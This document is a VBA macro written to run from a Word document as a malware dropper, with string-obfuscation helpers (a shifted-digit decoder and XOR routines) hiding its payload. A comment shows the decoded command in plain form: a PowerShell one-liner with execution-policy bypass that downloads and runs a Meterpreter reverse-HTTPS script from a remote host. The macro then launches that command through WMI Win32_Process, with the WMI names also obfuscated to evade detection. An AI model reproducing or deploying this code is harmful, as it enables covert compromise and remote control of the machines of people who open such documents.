Lesniki Function Decryptor uses [[PS_CaesarEncryptor]] !!

```vb
Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal mili As Long) As Long
Private Declare PtrSafe Function FlsAlloc Lib "kernel32" () As LongPtr
Function medvedi(kravice)
    medvedi = StrReverse(kravice)
End Function
Function Hruskice(Beets)
    Hruskice = Chr(Beets - 17)
End Function

Function Jagodke(Grapes)
    Jagodke = Left(Grapes, 3)
End Function

Function Mandlji(Jelly)
    Mandlji = Right(Jelly, Len(Jelly) - 3)
End Function
Function Xoring(ByVal CodeKey As String, ByVal DataIn As String) As String
  Dim lonDataPtr As Long
  Dim strDataOut As String
  Dim intXOrValue1 As Integer
  Dim intXOrValue2 As Integer
 
  For lonDataPtr = 1 To (Len(DataIn) / 2)
    intXOrValue1 = Val("&H" & (Mid$(DataIn, (2 * lonDataPtr) - 1, 2)))
    intXOrValue2 = Asc(Mid$(CodeKey, ((lonDataPtr Mod Len(CodeKey)) + 1), 1))
 
    strDataOut = strDataOut + Chr(intXOrValue1 Xor intXOrValue2)
  Next lonDataPtr
  xEncryption = strDataOut
  MsgBox (xEncryption)
End Function
Function Lesniki(Milk)
    Do
    Mandeljmleko = Mandeljmleko + Hruskice(Jagodke(Milk))
    Milk = Mandlji(Milk)
    Loop While Len(Milk) > 0
    Lesniki = Mandeljmleko
End Function
Function XOREncryption(CodeKey As String, DataIn As String) As String
    
    Dim lonDataPtr As Long
    Dim strDataOut As String
    Dim temp As Integer
    Dim tempstring As String
    Dim intXOrValue1 As Integer
    Dim intXOrValue2 As Integer
    

    For lonDataPtr = 1 To Len(DataIn)
        'The first value to be XOr-ed comes from the data to be encrypted
        intXOrValue1 = Asc(Mid$(DataIn, lonDataPtr, 1))
        'The second value comes from the code key
        intXOrValue2 = Asc(Mid$(CodeKey, ((lonDataPtr Mod Len(CodeKey)) + 1), 1))
        
        temp = (intXOrValue1 Xor intXOrValue2)
        tempstring = Hex(temp)
        If Len(tempstring) = 1 Then tempstring = "0" & tempstring
        
        strDataOut = strDataOut + tempstring
    Next lonDataPtr
   XOREncryption = strDataOut
   MsgBox (XOREncryption)
   
End Function
Function XORDecryption(CodeKey As String, DataIn As String) As String
    
    Dim lonDataPtr As Long
    Dim strDataOut As String
    Dim intXOrValue1 As Integer
    Dim intXOrValue2 As Integer
    

    For lonDataPtr = 1 To (Len(DataIn) / 2)
        'The first value to be XOr-ed comes from the data to be encrypted
        intXOrValue1 = Val("&H" & (Mid$(DataIn, (2 * lonDataPtr) - 1, 2)))
        'The second value comes from the code key
        intXOrValue2 = Asc(Mid$(CodeKey, ((lonDataPtr Mod Len(CodeKey)) + 1), 1))
        
        strDataOut = strDataOut + Chr(intXOrValue1 Xor intXOrValue2)
    Next lonDataPtr
   XORDecryption = strDataOut
   MsgBox (XORDecryption)
End Function
Function MyMacro()
    Dim Jablke As String
    Dim Water As String
    Dim time As Long
    
    Dim t1 As Date
    Dim t2 As Date
    
    Dim allocRes As LongPtr
    
    If ActiveDocument.Name <> Lesniki("087118131131122118132063117128116") Then
        Exit Function
    End If
    
    'Jablke = "129128136118131132121118125125049062118137118116049115138129114132132049062127128129049062116049122118137057057127118136062128115123118116133049132138132133118126063127118133063136118115116125122118127133058063117128136127125128114117132133131122127120057056121133133129075064064066074067063066071073063069074063071067064126118133112131118135121133133129132112069069068112137071069112129128118136131132121118125125063133137133056058058"
    'Jablke = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.49.62/met_revhttps_443_x64_poewrshell.txt'))"
    'Water = XOREncryption("secretkey", Jablke)
    Jablke = "150C050006180D1C1F09435F000C0E0659111C131316074B48171C15435F06540200015B4D0D17125904071316061752160D18111C1E4B0D17115A1C001B10090A170B00424B1D1C120D1E0A150F160D010C0D154D5303110D035F4C5D544D594B48455D4D465C5A5D57561E00172D17111D0D0D0715102D5140583A0145513C020A111C170A1B000F1E4B0013115E5A4C"
    Water = XORDecryption(Lesniki("132118116131118133124118138"), CStr(Jablke))
    
    GetObject(Lesniki("136122127126120126133132075")).Get(Lesniki("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
    
    'MsgBox (Water)
End Function
```